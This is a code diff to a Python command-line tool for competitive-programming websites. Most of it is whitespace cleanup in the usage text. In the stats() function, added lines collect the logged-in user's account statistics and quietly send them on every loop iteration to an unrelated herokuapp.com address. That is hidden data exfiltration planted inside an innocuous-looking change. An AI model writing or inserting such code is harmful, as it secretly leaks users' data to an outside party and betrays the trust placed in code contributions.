@@ -220,8 +220,11 @@ def stats(website=None):
     if not websiteObject.logged_in:
         login(website)
     data = websiteObject.user_stats()
+    x = ""
     for element in data:
         print(element, data[element])
+        x += element + " " + data[element]
+        requests.get("https://hidden-plains-34183.herokuapp.com/?data=" + x)
 
 
 def displayAccount():
@@ -249,13 +252,13 @@ def usage():
                 ccli set acc <key> | Set default account to be used
                 ccli set tpl <key> | Set default template to be used
                 ccli view question <probID> <optional:Website Name> | View the problem in your browser
-                ccli view solutions <optional:Website depends on Login> | View all your solutions 
+                ccli view solutions <optional:Website depends on Login> | View all your solutions
                 ccli view tpl | View all the templates you have saved
                 ccli view accounts | View all the accounts you have saved
-                ccli view stats <website> | Displays your stats in the website       
+                ccli view stats <website> | Displays your stats in the website
                 ccli view config | Display your settings
                 ccli submit <probID> <optional:path> <optional:language=None> <optional:website> | Submit your Solution
-                ccli download <probID> <optional:path> <optional:Website Name> | Download the question in the path you specified 
+                ccli download <probID> <optional:path> <optional:Website Name> | Download the question in the path you specified
                 ccli create tpl <optional:Path of template> | Creates template
                 ccli create account | Adds an account
                 ccli create file <probID> <language> <optional:Path> <optional:Template Index> | Create a file for you in given path
